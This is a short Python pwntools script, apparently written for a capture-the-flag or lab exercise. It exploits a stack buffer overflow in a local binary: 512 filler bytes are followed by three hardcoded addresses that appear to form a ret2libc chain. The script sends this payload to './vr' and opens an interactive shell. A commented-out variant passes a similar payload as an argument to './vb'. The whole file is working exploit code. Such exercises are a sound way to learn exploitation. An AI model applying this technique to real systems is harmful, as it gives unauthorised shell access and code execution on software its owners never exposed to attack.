from pwn import *

context.log_level = 'debug'
"""
shellcode = 512 * 'A' + 4 * 'B'
shellcode = 512 * '\x90' + p32(0xb7e29b40) + p32(0xb7e1d7f0) + p32(0xb7f4bdc8)

p = process(['./vb', shellcode])
p.interactive()
"""
shellcode = 512 * 'A'
shellcode += p32(0xb7e29b40) + p32(0xb7e1d7f0) + p32(0xb7f4bdc8)
p = process(['./vr',])
p.send(shellcode)
p.interactive()
#p.recvall()
#p.wait_for_close()
